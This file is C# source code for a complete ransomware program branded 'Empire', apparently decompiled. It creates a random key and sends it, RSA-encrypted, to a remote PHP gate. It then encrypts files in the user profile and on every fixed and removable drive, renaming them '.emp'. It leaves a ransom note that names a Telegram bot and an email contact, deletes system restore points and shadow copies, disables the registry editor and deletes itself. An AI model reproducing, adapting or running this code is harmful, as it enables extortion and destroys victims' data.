using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Cryptor;

internal class Program
{
	public static string gate1 = "http://a0902054.xsph.ru/one.php";

	public static string mutex = "ntyUBXFQTHyHkrn";

	public static string mail = "HowToDecryptReserve@proton.me";

	public static string urltgbot = "https://t.me/how_to_decrypt_bot";

	public static string publickey = "<RSAKeyValue><Modulus>7raY9jQP+Z0yh/yAnuy39gCHVtsr+6+nTIc6V3x+iu/5D1mfF9kTmF7sbe09kKvwxum3whfWguO5jjpz0awTtMb0Px+ot87tdAQwrifP8IYtBfdhHVJLGKTGDKR0g4HGCq1Piuui0NahHO+hHxgw91jri1O6DwPlNvUsAX1h/c47T0qFzJVOYTlqKYiHDzP0aSpAZw73kR33vq80q87H+A12SDWQY5a7sjIOaRKEoIPxbVvyu2n/2p5HvR+D/sCu+wdT2jslCKdhJGVmm3BNO/SW1XnvLDNoaZoCaeFi0AG7fK+K7SN//vS8Ru11fEpNHP1JmsYX0IN1J4znu2lOzQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	public static string extension = ".emp";

	public static string password;

	private static byte[] saltBytes;

	private static string salti;

	private static string hwid;

	private static string C_DIR = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

	private static string userfolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	public static string Mynote = "Empire welcomes you!\r\n--------------------\r\nAll your files are securely encrypted by our software.\r\nUnfortunately, nothing will be restored without our key and decryptor.\r\nIn this regard, we suggest you buy our decryptor to recover your information.\r\nTo communicate, use the Telegram bot at this link\r\n\n" + urltgbot + "\r\n\nIf the bot is unavailable, then write to the reserve email address: " + mail + "\r\n\r\nThere you will receive an up-to-date contact for personal communication.\r\n--------------------\r\n\r\nDo not try to recover files yourself, they may break and we will not be able to return them, also try not to turn off your computer until decryption.";

	public static StringBuilder Logs = new StringBuilder();

	public static Mutex currentApp;

	public static void Main(string[] args)
	{
		if (!CreateMutex())
		{
			Environment.Exit(0);
		}
		else
		{
			Run();
		}
	}

	public static bool CreateMutex()
	{
		currentApp = new Mutex(initiallyOwned: false, mutex, out var createdNew);
		return createdNew;
	}

	public static void CloseMutex()
	{
		if (currentApp != null)
		{
			currentApp.Close();
			currentApp = null;
		}
	}

	private static byte[] AES_Enc(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.KeySize / 8.0));
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.BlockSize / 8.0));
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	private static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < Math.Max(Interlocked.Decrement(ref length), length + 1))
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static void GenerateSalt()
	{
		try
		{
			using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
			saltBytes = new byte[16];
			rNGCryptoServiceProvider.GetBytes(saltBytes);
			salti = string.Join(",", saltBytes);
		}
		catch
		{
		}
	}

	private static void EncryptFile(string file, string password)
	{
		try
		{
			if (file != Process.GetCurrentProcess().MainModule.FileName && file != Application.StartupPath && file != Directory.GetCurrentDirectory() && !file.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower().Replace("system32", null)))
			{
				byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
				byte[] bytes = Encoding.UTF8.GetBytes(password);
				bytes = SHA256.Create().ComputeHash(bytes);
				byte[] bytes2 = AES_Enc(bytesToBeEncrypted, bytes);
				File.WriteAllBytes(file, bytes2);
				File.Move(file, file + extension);
				Logs.Append(file + Environment.NewLine);
			}
		}
		catch
		{
		}
	}

	private static void encryptDirectory(string location, string password)
	{
		try
		{
			string validExtensions = ".txt" + ".TXT" + ".jar" + ".exe" + ".dat" + ".contact" + ".settings" + ".doc" + ".docx" + ".xls" + ".xlsx" + ".ppt" + ".pptx" + ".odt" + ".jpg" + ".png" + ".jpeg" + ".gif" + ".csv" + ".py" + ".sql" + ".mdb" + ".sln" + ".php" + ".asp" + ".aspx" + ".html" + ".htm" + ".css" + ".md" + ".rtf" + ".yaml" + ".conf" + ".json5" + ".xml" + ".psd" + ".pdf" + ".dll" + ".c" + ".cs" + ".vb" + ".vbs" + ".p12" + ".mp3" + ".mp4" + ".f3d" + ".dwg" + ".cpp" + ".h" + ".chm" + ".chw" + ".msi" + ".zip" + ".rar" + ".mov" + ".rtf" + ".bmp" + ".mkv" + ".avi" + ".apk" + ".lnk" + ".iso" + ".7z" + ".ace" + ".arj" + ".bz2" + ".cab" + ".gzip" + ".gz" + ".tgz" + ".tar.gz" + ".tbz2" + ".tar.bz2" + ".txz" + ".tar.xz" + ".bkf" + ".tar.zip" + ".tar.7z" + ".tib" + ".gho" + ".bak" + ".ab" + ".vbk" + ".scr" + ".fbl" + ".dmp" + ".tmp" + ".wps" + ".com" + ".bat" + ".cmd" + ".msp" + ".cpl" + ".ps1" + ".vbs" + ".js" + ".wsf" + ".cmdx" + ".lzh" + ".tar" + ".uue" + ".xz" + ".z" + ".001" + ".mpeg" + ".mp3" + ".mpg" + ".core" + ".crproj" + ".pdb" + ".ico" + ".pas" + ".db" + ".torrent" + ".sqlite" + ".mysql" + ".dbf" + ".json" + ".postgresql" + ".oracle" + ".nosql" + ".wim" + ".cur" + ".sdb" + ".xsd" + "" + ".mui" + ".log" + ".rsm";
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			ParallelOptions parallelOptions = new ParallelOptions
			{
				MaxDegreeOfParallelism = 10
			};
			Parallel.ForEach(files, parallelOptions, delegate(string file)
			{
				string text = Path.GetExtension(file);
				if (validExtensions.Contains(text.ToLower()) && text != extension)
				{
					EncryptFile(file, password);
				}
			});
			ParallelOptions parallelOptions2 = new ParallelOptions
			{
				MaxDegreeOfParallelism = 5
			};
			Parallel.ForEach(directories, parallelOptions2, delegate(string directory)
			{
				encryptDirectory(directory, password);
			});
		}
		catch
		{
		}
	}

	private static void Run()
	{
		try
		{
			password = CreatePassword(50);
			GenerateSalt();
			hwid = Hwid.HWID();
			SendPassword(password, hwid, salti);
			DisableTSK.DisableRegEdit();
			UserFold(password);
			Fix_Drivers(password);
			OtherDrivers(password);
			password = null;
			WriteMessage();
			DeleteRestorePoints();
			Shadow.DelCopy();
			SDel("1");
		}
		catch
		{
		}
	}

	private static void UserFold(string password)
	{
		try
		{
			encryptDirectory(userfolder, password);
		}
		catch
		{
		}
	}

	private static void Fix_Drivers(string password)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		foreach (string text in logicalDrives)
		{
			DriveInfo driveInfo = new DriveInfo(text);
			if (driveInfo.DriveType == DriveType.Fixed && !driveInfo.ToString().Contains(C_DIR))
			{
				try
				{
					encryptDirectory(text, password);
				}
				catch
				{
				}
			}
		}
	}

	private static void OtherDrivers(string password)
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		foreach (string text in logicalDrives)
		{
			DriveInfo driveInfo = new DriveInfo(text);
			if (driveInfo.DriveType != DriveType.Fixed && !driveInfo.ToString().Contains(C_DIR))
			{
				try
				{
					encryptDirectory(text, password);
				}
				catch
				{
				}
			}
		}
	}

	private static void WriteMessage()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW-TO-DECRYPT.txt";
			string text2 = Mynote + Environment.NewLine + "Your ID is [" + hwid + "]";
			File.WriteAllText(text, text2 + Environment.NewLine + Environment.NewLine + "[[Encrypted Files]]" + Environment.NewLine + Logs.ToString());
			Process.Start(text);
		}
		catch
		{
		}
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	private static void DeleteRestorePoints()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()).GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.Current;
					try
					{
						SRRemoveRestorePoint(int.Parse(((ManagementBaseObject)val)["sequencenumber"].ToString()));
					}
					catch
					{
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
	}

	public static void SendPassword(string password, string hwid, string salt)
	{
		try
		{
			string value;
			string value2;
			using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider())
			{
				rSACryptoServiceProvider.FromXmlString(publickey);
				value = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(password), fOAEP: false));
				value2 = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(salt), fOAEP: false));
			}
			string address = gate1;
			using WebClient webClient = new WebClient();
			NameValueCollection data = new NameValueCollection
			{
				{ "Password", value },
				{ "Hwid", hwid },
				{ "Salt", value2 }
			};
			byte[] bytes = webClient.UploadValues(address, "POST", data);
			Encoding.UTF8.GetString(bytes);
		}
		catch
		{
		}
	}

	public static void SDel(string delay)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			Process.Start(processStartInfo);
		}
		catch
		{
		}
	}
}
